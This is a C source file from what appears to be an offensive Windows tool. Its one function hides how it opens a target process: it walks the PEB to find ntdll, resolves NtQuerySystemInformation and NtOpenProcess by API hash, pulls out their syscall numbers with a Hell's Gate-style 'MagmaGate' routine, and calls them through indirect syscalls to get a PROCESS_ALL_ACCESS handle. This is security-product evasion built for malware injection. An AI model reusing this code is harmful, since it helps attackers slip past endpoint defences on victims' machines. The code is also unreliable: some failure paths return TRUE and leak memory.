#include "box.h"
#include "struct.h"

BOOL GetRemoteProcessHandle
(
	IN LPCWSTR szProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	ULONG							uReturnLen1 = NULL,
									uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;
	HMODULE							ntdll = NULL;
	OBJECT_ATTRIBUTES				OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY			pImgDir = NULL;
	SYSCALL_INFO					info = { 0 };
	INSTRUCTIONS_INFO				syscallInfos[2] = { 0 };

	ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtQuerySystemInformation",
		"NtOpenProcess"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = sdbmrol16(
			Functions[i]
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
		(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! Reason: %lu", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Allocated Heap into the System Process Information!");

	pValueToFree = SystemProcInfo;

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	STATUS = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
		(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQuerySystemInformation Failed! Reason: 0x%0.8x", STATUS);
		return FALSE;
	}


	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{

			ULONG_PTR foundPid = (ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*PID = (DWORD)foundPid;

			CLIENT_ID CID;
			CID.UniqueProcess = (HANDLE)foundPid;
			CID.UniqueThread = NULL;

			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtOpenProcess
			STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
				(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS)
			{
				WARN("NtOpenProcess Failed! Reason: 0x%0.8x", STATUS);
				return FALSE;
			}
			break;

		}

		if (!SystemProcInfo->NextEntryOffset)
		{
			break;
		}


		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}



	if (pValueToFree)
		HeapFree(GetProcessHeap(), 0, pValueToFree);

	// check numeric PID and handle
	if (*PID == 0 || *hProcess == NULL)
		return FALSE;

	return TRUE;
}